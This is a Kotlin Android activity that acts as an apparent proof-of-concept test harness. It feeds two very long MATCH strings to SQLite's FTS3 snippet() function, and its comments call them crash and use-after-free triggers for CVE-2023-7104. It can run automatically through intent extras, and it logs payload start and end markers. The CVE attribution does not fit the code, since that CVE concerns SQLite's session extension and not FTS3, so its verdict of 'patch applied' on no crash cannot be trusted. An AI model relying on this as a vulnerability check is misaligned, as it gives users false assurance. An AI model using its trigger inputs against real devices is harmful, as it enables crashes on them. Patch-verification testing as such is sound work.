package com.example.sqlcve

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.database.sqlite.SQLiteDatabase
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.widget.Button
import java.util.concurrent.atomic.AtomicBoolean

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "CVE7104"
        private const val EXTRA_AUTORUN = "com.example.sqlcve.extra.AUTORUN"
        private const val EXTRA_START_DELAY_MS = "com.example.sqlcve.extra.START_DELAY_MS"
        private const val EXTRA_FINISH_AFTER_RUN = "com.example.sqlcve.extra.FINISH_AFTER_RUN"
    }

    private val triggered = AtomicBoolean(false)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val btn = findViewById<Button>(R.id.runButton)

        btn.setOnClickListener {
            runCveTest()
        }

        if (intent.getBooleanExtra(EXTRA_AUTORUN, false)) {
            val delayMs = intent.getLongExtra(EXTRA_START_DELAY_MS, 0L).coerceAtLeast(0L)
            Handler(Looper.getMainLooper()).postDelayed({ runCveTest() }, delayMs)
        }
    }

    private fun runCveTest() {
        if (!triggered.compareAndSet(false, true)) return
        Log.i(TAG, "CARVE_PAYLOAD_START family=sqlcve cve=CVE-2023-7104 payloads=2")
        Log.i(TAG, "Starting CVE-2023-7104 strong test...")

        val db = SQLiteDatabase.create(null)

        try {
            // Try FTS3 first (many AAOS builds expose only FTS3)
            db.execSQL("CREATE VIRTUAL TABLE t1 USING fts3(x);")
            db.execSQL("INSERT INTO t1 VALUES('test');")
            Log.i(TAG, "Created FTS3 table.")

            // ---- Payload 1: Repeated token (classic crash from upstream PoC)
            val payload1 = "aaaaa " + "a ".repeat(2000)

            Log.i(TAG, "Running payload 1...")
            db.rawQuery("SELECT snippet(t1) FROM t1 WHERE t1 MATCH ?", arrayOf(payload1)).use {
                while (it.moveToNext()) {}
            }

            // ---- Payload 2: Very long single token (known uaf trigger)
            val payload2 = "a".repeat(5000)

            Log.i(TAG, "Running payload 2...")
            db.rawQuery("SELECT snippet(t1) FROM t1 WHERE t1 MATCH ?", arrayOf(payload2)).use {
                while (it.moveToNext()) {}
            }

            Log.i(TAG, "Completed execution. If no crash, patch applied or FTS behavior differs.")
            Log.i(
                TAG,
                "CARVE_PAYLOAD_END family=sqlcve success=true evidence=fts_payloads_processed exploit_success=unknown"
            )

        } catch (t: Throwable) {
            Log.e(
                TAG,
                "CARVE_PAYLOAD_ERROR family=sqlcve stage=fts_payload_processing detail=${t.message}",
                t
            )
        } finally {
            db.close()
            if (intent.getBooleanExtra(EXTRA_FINISH_AFTER_RUN, true)) {
                Handler(Looper.getMainLooper()).postDelayed({ finishAndRemoveTask() }, 250)
            }
        }
    }
}
